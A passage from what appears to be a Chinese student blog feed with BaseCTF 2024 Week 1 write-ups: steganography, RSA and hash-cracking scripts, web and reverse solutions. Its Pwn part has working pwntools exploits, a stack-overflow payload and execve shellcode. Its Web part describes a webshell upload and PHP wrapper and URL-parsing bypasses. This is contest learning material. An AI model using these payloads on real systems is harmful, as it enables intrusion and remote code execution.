        <content type="html"><![CDATA[<p>ps:最近刚开学 很忙 会很慢的更</p><h2 id="最近接触到了Pwn-那就来顺带讲讲Pwn吧"><a href="#最近接触到了Pwn-那就来顺带讲讲Pwn吧" class="headerlink" title="最近接触到了Pwn 那就来顺带讲讲Pwn吧"></a>最近接触到了Pwn 那就来顺带讲讲Pwn吧</h2><p>基于我对pwn的理解 pwn的过程分别为下:<br>1.题目在大部分情况下会提供一个文件和相应环境<br>2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件<br>3.尝试通过nc 或python的pwn脚本来爆破出flag内容</p><h2 id="（在做了的）例题"><a href="#（在做了的）例题" class="headerlink" title="（在做了的）例题"></a>（在做了的）例题</h2><h2 id="BUUCTF-test-your-nc"><a href="#BUUCTF-test-your-nc" class="headerlink" title="[BUUCTF]test-your-nc"></a>[BUUCTF]test-your-nc</h2><p>这个题目标题就已经揭示了大部分的主要内容-用nc链接靶机i&#x2F;p获取flag</p><p><img src="1.jpg" alt="1"></p><p><img src="2.jpg" alt="2"></p><h2 id="后面的等我持续更新中（逃"><a href="#后面的等我持续更新中（逃" class="headerlink" title="后面的等我持续更新中（逃"></a>后面的等我持续更新中（逃</h2><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF高校联合新生赛2024</title>
      <link href="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/"/>
      <url>/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/</url>
      
        <content type="html"><![CDATA[<p>已经收到Kengwang的礼物啦<br><del>鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了</del><br>目前更新到了第一周的writeup</p><h1 id="第一周-我们的writeup"><a href="#第一周-我们的writeup" class="headerlink" title="第一周-我们的writeup"></a>第一周-我们的writeup</h1><p><strong>这里是队伍0penness在BaseCTF 高校联合新生赛中对于题目的相关解答&amp;writeup</strong><br>爱来自<a href="https://www.maonie.top/">猫涅</a>&amp;<a href="https://truthleader.github.io/">真理教教主</a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><p><img src="2.jpg" alt="2"><br>解压之后得到了一张图和压缩包<br>压缩包有密码保护 那么密码铁定就在这张图里边<br>放入stegsolve 解析图片<br><img src="3.jpg" alt="3">一眼base加密 拿去解码<br><img src="4.jpg" alt="4"><br>结果是个小提示 说明该图片经过了LSB加密<br>解密后翻到最上边确实有隐藏信息<br><img src="5.jpg" alt="5"><br>用这段key打开压缩包<br><img src="6.jpg" alt="6"><br>里面照样藏了个加密的压缩包 密码爆破也没用处 直接提示错误<br>根据压缩包的名称我们可以猜测这是一个伪加密zip<br>将他放进010editor 更改他的属性 解除伪加密<br><img src="1.png" alt="1"><br>然后解压就是了 是个txt 还是一眼base加密<br><img src="7.jpg" alt="7"><br>这是初步的结果 把前面的干扰项flag删除 继续解密<br><img src="8.jpg" alt="8"><br>flag get<br><img src="9.jpg" alt="9"></p><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><p>网站进不去怎么办涅<br>nslookup一下网站dns记录吧<br><img src="19.jpg" alt="19"><br>结束了</p><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><p>wireshark解包题 总之ctrl+f 字符串 flag<br><img src="16.jpg" alt="16"><br>有一个flag.jpg 和 flag.php 都追踪tcp流之后发现藏在php的里边<br><img src="17.jpg" alt="17"><br>flag字段明显是反转过的 去找网站转回来<br><img src="18.jpg" alt="18"><br>完事</p><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><p>把文件放进了ida pro 没什么好注意的点 除了hex编码下有一些倒转的flag.txt<br><img src="22.jpg" alt="22"><br>难道是要将整个文件的某种编码进行反转？<br>这里就搜到一个正好能用的小工具<br><img src="23.jpg" alt="23"><br>放进去转了一下 出来个inversion.bin<br><img src="24.jpg" alt="24"><br>表面是张jpg 但hex码中有flag.txt的字眼 经过判断 这是个经过binwalk组合的文件<br>进自带binwalk的kali 把他拆成两半 获得flag<br><img src="25.jpg" alt="25"></p><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><p>打开一看 一眼base加密</p><p><img src="20.jpg" alt="20"><br><img src="21.jpg" alt="21"><br>获取</p><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line"># 给定的flag模板和哈希值</span><br><span class="line">flag\_template = &#x27;BaseCTF&#123;s1Mpl3\_1s\_BeTt3r\_Th4n\_C0mPl3x&#125;&#x27;</span><br><span class="line">target\_hash = &#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span><br><span class="line"># 可能的字符集（这里假设是小写字母和数字）</span><br><span class="line">charset = &#x27;QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><span class="line"># 遍历所有可能的两个字符组合</span><br><span class="line">for chars in itertools.product(charset, charset):</span><br><span class="line"># 生成当前尝试的flag</span><br><span class="line">current\_flag = flag\_template.replace(&#x27;??&#x27;, &#x27;&#x27;.join(chars))</span><br><span class="line"># 计算当前flag的SHA-1哈希值</span><br><span class="line">current\_hash = hashlib.sha1(current\_flag.encode()).hexdigest()</span><br><span class="line"># 检查哈希值是否匹配</span><br><span class="line">print(current\_hash)</span><br><span class="line">if current\_hash == target\_hash:</span><br><span class="line">print(f&quot;找到匹配的flag: &#123;current\_flag&#125;&quot;)</span><br><span class="line">break # 找到匹配项后退出循环</span><br><span class="line">else:</span><br><span class="line">print(&quot;没有找到匹配的flag&quot;)</span><br></pre></td></tr></table></figure><h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><p>给了段音乐 提示为“屏蔽立体音，发现隐藏的东西”<br>我是在用potplayer尝试用不同音轨输出时发现的<br><img src="10.jpg" alt="10"><br>将中置声音完全屏蔽 增大其他轨道的音量 仔细听会有五段规律相同的摩斯密码<br>那时候有点太兴奋了忘了记录过程 总之录屏下来放进了pr 用音轨可视化得出了摩斯密码<br><img src="11.png" alt="11"></p><p><img src="12.jpg" alt="12"></p><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><p>群相册里有十张倒计时的图片 每一张都藏着一部分flag<br>鉴于已经公开了flag 我这里列出部分过程截图<br><img src="13.jpg" alt="13"><br><img src="14.jpg" alt="14"><br><img src="15.jpg" alt="15"></p><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><p>这个就没啥好说的了</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi&#x3D;(p+2)<em>(q+2)&#x3D;p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)&#x3D;p<code>*</code>q-p-q+1</p><p>n &#x3D; p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p><p>n的欧拉函数 &#x3D; (not_phi-n-4)&#x2F;&#x2F;2</p><p>得到欧拉函数就可以用模逆元算d</p><p>有c d n就有明文</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from sympy import mod\_inverse</span><br><span class="line">e=65537</span><br><span class="line">c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br><span class="line">not\_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br><span class="line">n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br><span class="line">pplusq=(not\_phi-n-4)//2</span><br><span class="line">phi=n+1-pplusq</span><br><span class="line">d = mod\_inverse(e, phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p><ol><li>把flag转换为2进制</li><li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li><li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li></ol><p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p><p>总之exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># a = ···</span><br><span class="line"># c = ···</span><br><span class="line">for i in a:</span><br><span class="line">if c&gt;i:</span><br><span class="line">c-=i</span><br><span class="line">print(1,end=&#x27;&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(0,end=&#x27;&#x27;)</span><br><span class="line">flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100</span><br><span class="line">print(libnum.n2s(flag))</span><br></pre></td></tr></table></figure><h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from sympy import mod\_inverse</span><br><span class="line">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="line">e = 65537</span><br><span class="line">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="line">phi = n-1</span><br><span class="line">d = mod\_inverse(e, phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256&#x3D;c</p><p>那么 m&#x3D;c*17关于256的模逆元%256<br>可以很容易的知道是241</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">98, 113, 163, 181, 115, 148, 166, 43, 9, 95,</span><br><span class="line">165, 146, 79, 115, 146, 233, 112, 180, 48, 79,</span><br><span class="line">65, 181, 113, 146, 46, 249, 78, 183, 79, 133,</span><br><span class="line">180, 113, 146, 148, 163, 79, 78, 48, 231, 77</span><br><span class="line">]</span><br><span class="line">for int in cipher:</span><br><span class="line">print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">print()</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">cipher[i] = (cipher[i]\*241) % 256</span><br><span class="line">for int in cipher:</span><br><span class="line">print(chr(int),end=&#x27;&#x27;)</span><br><span class="line"># 或者，如果你不想使用预定义的逆元</span><br><span class="line"># x = solve\_modular\_equation(y, multiplier=17, modulus=256)</span><br><span class="line"># print(f&quot;x = &#123;x&#125;&quot;) # 同样应该输出 x = 148</span><br></pre></td></tr></table></figure><h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import \*</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import random</span><br><span class="line">import libnum</span><br><span class="line">key = libnum.n2s(208797759953288399620324890930572736628)</span><br><span class="line">my\_aes=AES.new(key=key,mode=AES.MODE\_ECB)</span><br><span class="line">c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><span class="line">decrypted\_padded = my\_aes.decrypt(c)</span><br><span class="line">print(decrypted\_padded)</span><br></pre></td></tr></table></figure><h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">def build\_md5\_dict():</span><br><span class="line">md5\_dict = &#123;&#125;</span><br><span class="line">characters = string.ascii\_letters + string.digits + string.punctuation</span><br><span class="line">for char in characters:</span><br><span class="line">md5\_hash = hashlib.md5(char.encode()).hexdigest()</span><br><span class="line">md5\_dict[md5\_hash] = char</span><br><span class="line">return md5\_dict</span><br><span class="line"># 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）</span><br><span class="line">md5\_dict = build\_md5\_dict()</span><br><span class="line"># 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。</span><br><span class="line">def recover\_string\_from\_md5\_list(md5\_list, md5\_dict):</span><br><span class="line">recovered\_string = &quot;&quot;</span><br><span class="line">for md5\_hash in md5\_list:</span><br><span class="line">if md5\_hash in md5\_dict:</span><br><span class="line">recovered\_string += md5\_dict[md5\_hash]</span><br><span class="line">else:</span><br><span class="line"># 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常</span><br><span class="line">recovered\_string += &quot;?&quot;</span><br><span class="line">return recovered\_string</span><br><span class="line"># 示例MD5列表</span><br><span class="line">md5\_list = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="line"># 使用步骤1中生成的md5\_dict来恢复字符串</span><br><span class="line">recovered\_string = recover\_string\_from\_md5\_list(md5\_list, md5\_dict)</span><br><span class="line">print(recovered\_string)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img src="web_1_1.png" alt="text"><br><img src="web_1_2.png" alt="text"></p><p>就能在网络包里发现flag<br><img src="web_1_3.png" alt="text"></p><h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><p>easy<br><img src="web_2.png" alt="alt text"></p><h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img src="web_3.png" alt="alt text"></p><h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img src="web_4.png" alt="alt text"></p><h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img src="web_5_1.png" alt="text"><br><img src="web_5_2.png" alt="text"><br><img src="web_5_3.png" alt="text"></p><h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p><ol><li>需要以<a href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li><li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li></ol><p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http:&#x2F;&#x2F;jasmineaura.github.io@truthleader.github.io</a></p><p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img src="web_6_1.png" alt="alt text"></p><p>base64解密<br><img src="web_6_2.png" alt="alt text"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat &#x2F;flag直接有</p><p><img src="pwn_qiandao.png"></p><h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img src="pwn_echo.png"></p><h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img src="pwn_ret2text1.png" alt="alt text"><br>而字符串大小为32<br><img src="pwn_ret2text2.png" alt="alt text"></p><p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import \*</span><br><span class="line">context.log\_level=&#x27;debug&#x27;</span><br><span class="line">sh = remote(&#x27;challenge.basectf.fun&#x27;,31868)</span><br><span class="line">payload=b&#x27;0&#x27;\*(32+8)+p64(0x4011BB)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img src="pwn_shellcode1.png" alt="alt text"><br><img src="pwn_shellcode2.png" alt="alt text"><br><img src="pwn_shellcode3.png" alt="alt text"></p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import \*</span><br><span class="line">context.log\_level=&#x27;debug&#x27;</span><br><span class="line">sh = process(&#x27;./shellcode\_level0&#x27;)</span><br><span class="line">elf = ELF(&#x27;./shellcode\_level0&#x27;)</span><br><span class="line">payload=b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img src="pwn_wbtdl1.png" alt="alt text"><br><img src="pwn_wbtdl2.png" alt="alt text"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img src="reverse_ezida3.png" alt="text"><br><img src="reverse_ezida1.png" alt="text"><br><img src="reverse_ezida2.png" alt="text"></p><h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img src="reverse_upx1.png" alt="alt text"><br><img src="reverse_upx2.png" alt="alt text"><br><img src="reverse_upx3.png" alt="alt text"></p><h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img src="reverse_maze1.png" alt="text"><br><img src="reverse_maze2.png" alt="text"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x$$$$$$$$$$$$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$</span><br><span class="line">&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$</span><br><span class="line">&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$</span><br><span class="line">&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$</span><br><span class="line">$$$$$$&amp;$$$$$$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$</span><br><span 